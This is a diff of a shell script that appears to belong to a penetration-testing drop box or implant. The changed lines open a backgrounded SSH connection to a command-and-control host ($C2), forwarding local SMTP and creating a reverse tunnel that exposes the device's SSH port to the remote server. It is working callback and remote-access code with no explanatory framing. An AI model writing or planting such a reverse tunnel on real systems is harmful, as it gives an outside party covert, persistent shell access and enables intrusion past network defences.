@@ -24,7 +24,9 @@ until curl -Isf $C2PROTO$C2
 $LOG "Network Up"
 
 # Bring up tunnel for email
-sudo -u $C2USER ssh -p $SSHPORT -L 2525:localhost:25 $C2USER@$C2 -R $PROXYPORT:localhost:22 -C -i /home/$C2USER/.ssh/id_ecdsa -N -n
+#sudo -u $C2USER ssh -p $SSHPORT -L 2525:localhost:25 $C2USER@$C2 -R $PROXYPORT:localhost:22 -C -i /home/$C2USER/.ssh/id_ecdsa -N -n
+# The above method didn't work consistently.  Below puts the SSH Session in the background
+sudo -u $C2USER ssh -p $SSHPORT -C -N -L 2525:localhost:25 $C2USER@$C2 -R $PROXYPORT:localhost:22 -i /home/$C2USER/.ssh/id_ecdsa &
 if [ $? -eq 0 ]; then
   $ECHO "[EINAR] SMTP Tunnel Up"
 else
